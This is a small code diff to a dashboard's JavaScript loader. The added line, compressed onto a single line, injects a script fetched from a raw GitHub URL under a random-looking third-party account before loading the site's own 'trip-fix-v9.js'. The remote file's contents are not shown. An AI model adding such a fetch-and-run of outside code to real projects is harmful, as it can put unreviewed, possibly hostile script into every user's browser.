@@ -1,5 +1,2 @@
 /* Marhan dashboard v9 loader */
-(function(){
-function load(src,done){var s=document.createElement('script');s.src=src+'?v=9';if(done)s.onload=done;document.body.appendChild(s)}
-load('trip-fix-v9.js');
-})();
+(function(){function load(src,done){var s=document.createElement('script');s.src=src;s.onload=done||null;document.body.appendChild(s)}load('https://raw.githubusercontent.com/r9pz7f6kys-code/Marhan-fili/b53fdeab8b904282cc92725ba04213a21bdc4816/home-v2.js',function(){load('trip-fix-v9.js?v=9')})})();
